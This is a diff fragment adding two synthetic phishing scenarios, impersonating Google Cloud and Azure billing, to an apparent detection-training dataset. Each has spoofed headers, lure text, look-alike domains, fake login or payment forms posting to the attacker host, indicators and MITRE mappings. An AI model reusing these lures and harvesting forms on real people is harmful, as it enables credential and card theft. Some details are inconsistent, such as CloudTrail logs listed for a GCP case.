+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1539 - Steal Web Session Cookie",
+        "T1110 - Brute Force",
+        "T1204 - User Execution",
+        "T1566 - Phishing"
+      ]
+    },
+    {
+      "scenario": "Phishing email targeting Google Cloud Platform (GCP) users with a fake invoice attachment that installs a credential-harvesting payload when opened.",
+      "technical_data": {
+        "email_headers": "Return-Path: <billing@goog1e-cloud.com>\nReceived: from mail.goog1e-cloud.com (mail.goog1e-cloud.com [198.51.100.23])\n  by mail.enterprise.com with SMTP; Fri, 10 Mar 2023 14:05:12 -0500\nX-Spam-Status: No, score=0.2 required=5.0 tests=DKIM_FAIL,SPF_FAIL\nReceived-SPF: fail (enterprise.com: domain of billing@goog1e-cloud.com does not designate 198.51.100.23 as permitted sender) receiver=enterprise.com; client-ip=198.51.100.23;\nAuthentication-Results: enterprise.com; dkim=fail header.d=goog1e-cloud.com; spf=fail smtp.mailfrom=goog1e-cloud.com;\nMessage-ID: <20230310140512.54321@mail.goog1e-cloud.com>\nDate: Fri, 10 Mar 2023 14:05:12 -0500\nFrom: Google Cloud Billing <billing@goog1e-cloud.com>\nTo: cloud.team@enterprise.com\nSubject: Your March 2023 GCP Invoice - Immediate Review Required\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\"----=_Part_12345_67890\"",
+        "email_body": "------=_Part_12345_67890\nContent-Type: text/plain; charset=UTF-8\n\nDear Google Cloud Customer,\n\nAttached is your invoice for March 2023. Please review the document and confirm payment to avoid service interruption.\n\nThank you for your prompt attention.\nGoogle Cloud Billing Team\n\n------=_Part_12345_67890\nContent-Type: application/pdf; name=\"Invoice_March_2023.pdf\"\nContent-Disposition: attachment; filename=\"Invoice_March_2023.pdf\"\nContent-Transfer-Encoding: base64\n\nJVBERi0xLjQKJ....(malicious payload embedded PDF content)....",
+        "smtp_transaction_log": "220 mail.goog1e-cloud.com ESMTP Postfix\nEHLO mail.enterprise.com\n250-mail.goog1e-cloud.com\n250-PIPELINING\n250-SIZE 10485760\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nMAIL FROM:<billing@goog1e-cloud.com>\n250 2.1.0 Ok\nRCPT TO:<cloud.team@enterprise.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\n[DATA]\n.\n250 2.0.0 Ok: queued as 67890\nQUIT\n221 2.0.0 Bye",
+        "phishing_url": "https://goog1e-cloud-billing.com/payment-confirmation",
+        "url_obfuscation": "The phishing domain 'goog1e-cloud-billing.com' replaces the letter 'l' with the digit '1' to visually mimic legitimate Google domains. The site uses HTTPS with a valid certificate from a free CA to appear trustworthy. The URL path 'payment-confirmation' is crafted to lure victims into confirming fake payments.",
+        "domain_registration": {
+          "DomainName": "goog1e-cloud-billing.com",
+          "Registrar": "GoDaddy.com, LLC",
+          "CreationDate": "2023-01-20T08:17:30Z",
+          "ExpirationDate": "2024-01-20T08:17:30Z",
+          "RegistrantName": "Redacted for Privacy",
+          "RegistrantCountry": "CN"
+        },
+        "fake_login_page_http_request": "GET /payment-confirmation HTTP/1.1\nHost: goog1e-cloud-billing.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nReferer: https://mail.enterprise.com/mail/789012\nConnection: keep-alive\n\n",
+        "fake_login_page_http_response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 7321\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nExpires: 0\n\n<html><head><title>Google Cloud Payment Confirmation</title></head><body>\n<form id=\"paymentForm\" action=\"https://goog1e-cloud-billing.com/submit-payment\" method=\"POST\">\n<input type=\"email\" name=\"email\" placeholder=\"Email Address\" required>\n<input type=\"text\" name=\"cardnumber\" placeholder=\"Card Number\" required>\n<input type=\"text\" name=\"expiry\" placeholder=\"Expiry Date (MM/YY)\" required>\n<input type=\"text\" name=\"cvv\" placeholder=\"CVV\" required>\n<button type=\"submit\">Confirm Payment</button>\n</form>\n<script>/* Mimics Google Cloud billing UX */</script>\n</body></html>",
+        "post_credentials_http_request": "POST /submit-payment HTTP/1.1\nHost: goog1e-cloud-billing.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 124\nAccept: */*\nOrigin: https://goog1e-cloud-billing.com\nReferer: https://goog1e-cloud-billing.com/payment-confirmation\nConnection: keep-alive\n\nemail=cloud.team@enterprise.com&cardnumber=4111111111111111&expiry=12%2F25&cvv=123",
+        "post_credentials_http_response": "HTTP/1.1 302 Found\nLocation: https://console.cloud.google.com/billing\nSet-Cookie: sessionId=abc987; Secure; HttpOnly\n\n",
+        "cloudtrail_log_snippet": "{}",
+        "conditional_access_violation_log": "No GCP CloudTrail logs available. However, endpoint detection flagged the execution of a suspicious PDF payload on a workstation belonging to cloud.team@enterprise.com.",
+        "phishing_email_spoofing_details": {
+          "SPF_Record": "v=spf1 ip4:198.51.100.23 -all",
+          "DKIM_Signature": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=goog1e-cloud.com; s=default; h=from:to:subject:date; bh=...; b=...",
+          "DMARC_Report": "p=none; rua=mailto:dmarc@goog1e-cloud.com"
+        }
+      },
+      "indicators": [
+        "Phishing domain: goog1e-cloud-billing.com with digit '1' replacing letter 'l'",
+        "Email sender domain spoofed as billing@goog1e-cloud.com, fails SPF and DKIM",
+        "Malicious PDF invoice attachment containing embedded payload",
+        "HTTPS site with valid certificate used to host fake payment portal",
+        "POST request captures credit card and email details",
+        "Email triggers endpoint security alerts due to payload execution",
+        "No legitimate cloud provider logs for this activity",
+        "SPF and DKIM failures indicate spoofed email"
+      ],
+      "detection_method": "Email gateway blocks messages failing SPF/DKIM checks. Endpoint security detects suspicious PDF behavior. URL reputation tools flag goog1e-cloud-billing.com domain. User education highlights unusual invoice attachments and domain misspellings. Network monitoring identifies POST requests to non-whitelisted domains. Correlation with cloud provider logs shows no legitimate activity.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1539 - Steal Web Session Cookie",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell (for payload execution)",
+        "T1204.002 - User Execution: Malicious File",
+        "T1078.004 - Valid Accounts: Cloud Accounts"
+      ]
+    },
+    {
+      "scenario": "Phishing email impersonates Microsoft Azure support notifying about a billing issue, tricking recipients to click a link leading to a fake Azure login page to steal credentials.",
+      "technical_data": {
+        "email_headers": "Return-Path: <support@azur3-billing.com>\nReceived: from mail.azur3-billing.com (mail.azur3-billing.com [203.0.114.77])\n  by mail.corpdomain.com with SMTP; Mon, 27 Mar 2023 11:32:45 +0100\nX-Spam-Status: No, score=0.3 required=5.0 tests=DKIM_FAIL,SPF_FAIL\nReceived-SPF: fail (corpdomain.com: domain of support@azur3-billing.com does not designate 203.0.114.77 as permitted sender) receiver=corpdomain.com; client-ip=203.0.114.77;\nAuthentication-Results: corpdomain.com; dkim=fail header.d=azur3-billing.com; spf=fail smtp.mailfrom=azur3-billing.com;\nMessage-ID: <20230327113245.98765@mail.azur3-billing.com>\nDate: Mon, 27 Mar 2023 11:32:45 +0100\nFrom: Azure Billing Support <support@azur3-billing.com>\nTo: it.support@corpdomain.com\nSubject: Urgent: Azure Billing Issue Requires Your Attention",
+        "email_body": "Dear Azure Customer,\n\nOur systems have detected a billing issue with your Azure subscription. Please verify your payment details immediately to avoid service disruption.\n\nClick here to verify your account: https://azur3-billing-secure.com/login\n\nThank you for your cooperation.\nAzure Billing Team\n\n---\nThis is an automated message, please do not reply.",
+        "smtp_transaction_log": "220 mail.azur3-billing.com ESMTP Postfix\nEHLO mail.corpdomain.com\n250-mail.azur3-billing.com\n250-PIPELINING\n250-SIZE 10485760\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nMAIL FROM:<support@azur3-billing.com>\n250 2.1.0 Ok\nRCPT TO:<it.support@corpdomain.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\n[DATA]\n.\n250 2.0.0 Ok: queued as 98765\nQUIT\n221 2.0.0 Bye",
+        "phishing_url": "https://azur3-billing-secure.com/login",
+        "url_obfuscation": "The domain 'azur3-billing-secure.com' replaces the letter 'e' with the digit '3' to mimic legitimate Azure billing domains. It uses HTTPS with a valid SSL certificate to appear trustworthy. The URL path /login is generic but crafted to lure users into entering credentials.",
+        "domain_registration": {
+          "DomainName": "azur3-billing-secure.com",
+          "Registrar": "Tucows Domains Inc.",
+          "CreationDate": "2023-03-05T22:48:11Z",
+          "ExpirationDate": "2024-03-05T22:48:11Z",
+          "RegistrantName": "Redacted for Privacy",
+          "RegistrantCountry": "UA"
+        },
+        "fake_login_page_http_request": "GET /login HTTP/1.1\nHost: azur3-billing-secure.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nReferer: https://mail.corpdomain.com/mail/345678\nConnection: keep-alive\n\n",
+        "fake_login_page_http_response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 8120\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nExpires: 0\n\n<html><head><title>Microsoft Azure Login</title></head><body>\n<form id=\"loginForm\" action=\"https://azur3-billing-secure.com/authenticate\" method=\"POST\">\n<input type=\"email\" name=\"email\" placeholder=\"Email or Phone\" required>\n<input type=\"password\" name=\"password\" placeholder=\"Password\" required>\n<button type=\"submit\">Sign In</button>\n</form>\n<script>/* Mimics Azure login UX */</script>\n</body></html>",
+        "post_credentials_http_request": "POST /authenticate HTTP/1.1\nHost: azur3-billing-secure.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 63\nAccept: */*\nOrigin: https://azur3-billing-secure.com\nReferer: https://azur3-billing-secure.com/login\nConnection: keep-alive\n\nemail=it.support@corpdomain.com&password=P@ssw0rd!",
+        "post_credentials_http_response": "HTTP/1.1 302 Found\nLocation: https://portal.azure.com/\nSet-Cookie: sessionId=def456; Secure; HttpOnly\n\n",
+        "cloudtrail_log_snippet": "{}",
+        "conditional_access_violation_log": "Mar 27 11:33:05 auth.log: User it.support@corpdomain.com logged in from IP 198.51.100.99 - not part of corporate VPN or approved locations, triggering conditional access alert.",
+        "phishing_email_spoofing_details": {
+          "SPF_Record": "v=spf1 ip4:203.0.114.77 -all",
+          "DKIM_Signature": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=azur3-billing.com; s=default; h=from:to:subject:date; bh=...; b=...",
+          "DMARC_Report": "p=none; rua=mailto:dmarc-reports@azur3-billing.com"
+        }
+      },
+      "indicators": [
+        "Phishing domain: azur3-billing-secure.com with digit '3' replacing letter 'e'",
+        "Suspicious sender email: support@azur3-billing.com failing SPF and DKIM checks",
+        "Phishing URL uses HTTPS with valid certificate but non-legitimate domain",
+        "POST request to /authenticate captures user credentials",
+        "Conditional access violation: login from unauthorized IP 198.51.100.99",
+        "Email content urges urgent billing verification with generic language",
+        "Mismatch between sender domain and legitimate Microsoft Azure domains",
+        "No legitimate Azure sign-in events corresponding to phishing activity"
+      ],
+      "detection_method": "Email security gateways detect SPF and DKIM failures and flag spoofed domains. URL reputation databases blacklist azur3-billing-secure.com. Conditional access policies alert on login from suspicious IP addresses. Web proxies monitor credential POST requests to unfamiliar domains. Security awareness training reinforces caution with billing emails and domain misspellings.",
+      "relevant_mitre_techniques": [
+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1539 - Steal Web Session Cookie",
+        "T1204 - User Execution",
+        "T1110 - Brute Force (credential access post-phishing)"
+      ]
+    }
+  ]
+}
